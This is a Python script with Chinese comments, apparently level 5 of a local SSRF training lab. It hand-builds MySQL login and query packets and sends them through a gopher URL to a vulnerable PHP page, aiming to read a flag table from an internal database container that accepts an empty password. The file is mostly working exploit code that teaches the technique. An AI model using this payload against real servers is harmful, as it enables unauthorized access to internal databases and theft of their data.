"""L5 · 手工拼 MySQL 协议包

gopher 把字节原样灌进 3306，所以我们得自己当 MySQL 客户端：
    1. HandshakeResponse41（seq=1）—— 登录
    2. COM_QUERY（seq=0）—— 查询

能这么打的前提是目标账号**密码为空**：
有密码时要算 SHA1(pass) XOR SHA1(salt + SHA1(SHA1(pass)))，
而 salt 每次连接随机，gopher 只发不收拿不到它。

包头格式：3 字节小端长度 + 1 字节序号 + 载荷。

注意：这一关的接口用 stream_socket_client 直发，不走 curl。
libcurl 的 gopher 实现内部是 C 字符串，payload 里的 %00 会截断 ——
而 MySQL 包的 3 字节长度字段几乎必然带 NUL。

跑法：
    python3 05_mysql_gopher.py
"""

import struct
import sys

from _util import gopher_url, report, send

# CLIENT_LONG_PASSWORD | LONG_FLAG | PROTOCOL_41 | TRANSACTIONS | SECURE_CONNECTION
CAPS = 0x1 | 0x4 | 0x200 | 0x2000 | 0x8000


def pkt(payload, seq):
    """MySQL 包：3 字节小端长度 + 1 字节序号 + 载荷。"""
    return struct.pack("<I", len(payload))[:3] + bytes([seq]) + payload


def handshake(username=b"ssrf"):
    """HandshakeResponse41，空密码时 auth_response 长度为 0。"""
    body = (
        struct.pack("<I", CAPS)      # capabilities
        + struct.pack("<I", 0x01000000)  # max packet size
        + b"\x21"                    # charset: utf8_general_ci
        + b"\x00" * 23               # 保留位
        + username + b"\x00"          # 用户名
        + b"\x00"                    # auth_response 长度 = 0
    )
    return pkt(body, 1)


def main():
    sql = "SELECT val FROM secret.flag"
    payload = handshake() + pkt(b"\x03" + sql.encode(), 0) + pkt(b"\x01", 0)

    print("payload 共 %d 字节" % len(payload))
    print("前 32 字节:", payload[:32].hex(" "))
    print()

    # 确认宿主机连不到靶场的 3306 —— 这就是 SSRF 存在的意义
    import socket
    s = socket.socket()
    s.settimeout(1)
    reachable = s.connect_ex(("127.0.0.1", 3306)) == 0
    s.close()
    if reachable:
        print("宿主机 127.0.0.1:3306 → 通")
        print("  注意：这多半是你本机自己装的 MySQL，不是靶场的 db 容器。")
        print("  靶场的 db 没有映射端口，只有 web 容器能连到它。")
    else:
        print("宿主机 127.0.0.1:3306 → 不通（正常，靶场的 db 没映射端口）")
    print()

    body = send("l5.php", gopher_url("db", 3306, payload))
    return 0 if report(body) else 1


if __name__ == "__main__":
    sys.exit(main())
